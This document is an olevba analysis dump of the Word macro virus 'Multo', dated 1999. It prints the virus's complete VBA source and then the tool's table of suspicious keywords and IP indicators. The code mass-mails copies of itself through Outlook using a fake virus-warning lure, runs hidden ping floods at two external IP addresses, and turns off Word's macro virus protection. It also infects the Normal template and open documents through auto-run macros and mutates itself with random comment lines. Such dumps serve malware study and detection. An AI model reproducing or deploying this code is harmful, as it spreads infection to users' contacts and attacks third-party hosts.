olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Multo-f6e7f7886b3786e77d3f7bbe68a3094cb3f9a87b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Multo-f6e7f7886b3786e77d3f7bbe68a3094cb3f9a87b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Multo.bas 
in file: Virus.MSWord.Multo-f6e7f7886b3786e77d3f7bbe68a3094cb3f9a87b - OLE stream: 'Macros/VBA/Multo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'VirusName: Multo
'Author Name: Lucky Warrior
'Date and Time:10/21/99 9:15:55 PM
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953






    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'AutoOpen
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = 0
Randomize                                                                                                             Set oa = CreateObject("Outlook.Application")
Set mn = oa.GetNameSpace("MAPI")
If oa = "Outlook" Then
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
mn.Logon "profile", "password"
For y = 1 To mn.AddressLists.Count
x = 1
Set ab = mn.AddressLists(y)
Set Multo = oa.CreateItem(0)
For z = 1 To ab.AddressEntries.Count
vi = ab.AddressEntries(x)
Multo.Recipients.Add vi
x = x + 1
If x > 60 Then z = ab.AddressEntries.Count
Next z
Multo.Subject = "Fwd: VIRUS WARNING!!!"
    Rem 320.5001    74.30288    84.834  16.13545    37.12873
    Rem 218.3901    17.55273    158.997 23.47568    1.415403
Multo.Body = "Somebody by the nickname of Lucky Warrior is sending out a virus that could harm your computer. DO NOT OPEN ANYTHING FROM HIM. MICROSOFT & AOL has said that this is a very dangerous virus. Attached herewith are the info & instruction on how to remove this virus, just in case you encountered this. Please practice cautionary measures and forward this to all your on-line friends ASAP."
Multo.Attachments.Add ActiveWorkbook.FullName
Multo.Send
vi = ""
    Rem 422.0655    7.834387    71.018  49.13043    42.7548
Next y
mn.Logoff
End If
q = Int(6 * Rnd)
If q = 2 Then
Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 205.136.165.243", vbHide
ElseIf q = 4 Then
Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 208.160.226.2", vbHide
End If
End Sub


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'AutoClose
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub AutoClose()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
DocInfect = True
End If
Next
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
GlobInfect = True
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
End If
Next
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
    Rem 359.5086    23.78064    37.64516    86.48545    12.47549
Options.SaveNormalPrompt = False
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
End If
    Rem 58.3537 0.0192976   85.88705    118.2699    26.65668
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
    Rem 20.4449 38.59425    32.96275    155.6162    28.8428
If DocInfect = False Then
    Rem 249.1892    73.83636    86.11942    73.15584    41.51503
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
Call Polymorphic
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
End Sub

    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436

    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
'AutoExec
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
Sub AutoExec()
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
On Error Resume Next
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 436.9924    9.169865    147.7512    111.6377    17.03859
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 316.3532    14.32714    67.66692    97.77186    39.91853
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
DocInfect = True
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
End If
    Rem 223.9354    16.61018    52.75775    17.17723    28.89984
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
Call Polymorphic
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
    Rem 194.5277    40.72545    36.44505    111.4538    24.00169
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
End Sub
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'FileSave
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub FileSave()
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
On Error Resume Next
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
Call Payload
Application.ScreenUpdating = False
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
GlobInfect = True
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
End If
Next
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Polymorphic
ActiveDocument.Save
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ToolsMacro macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsMacro()
Call Polymorphic
Beep
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ViewVBCode macro
    Rem 124.1888    53.89174    41.06063    16.18138    1.51658
    Rem 422.1868    26.48135    86.87058    14.52444    31.08422
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
Sub ViewVBCode()
Call Polymorphic
Beep
End Sub
    Rem 169,959 76,95625    139,4313    10,12263    46,52827

    Rem 169,959 76,95625    139,4313    10,12263    46,52827
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ToolsCustomize macro
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsCustomize()
Call Polymorphic
Beep
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
End Sub
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066

    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
    Rem 305.9546    57.75161    159.4834    61.16509    24.26535
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
    Rem 37.26157    15.3538 108.6261    81.75741    17.49413
'FileTemplates macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub FileTemplates()
Call Polymorphic
Beep
End Sub


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Polymorphic macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Polymorphic()
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("Multo").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("Multo").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Payload macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Payload()
  On Error Resume Next
  With Selection.Find
  .Text = "for"
  .Replacement.Text = "Multo"
  .Wrap = wdFindContinue
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  ActiveDocument.SaveAs ActiveDocument.FullName
  With Dialogs(wdDialogFileSummaryInfo)
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
  .Author = "Lucky Warrior"
  .Comments = "Multo by Lucky Warrior"
  .Execute
  End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|OPEN                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |205.136.165.243     |IPv4 address                                 |
|IOC       |208.160.226.2       |IPv4 address                                 |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

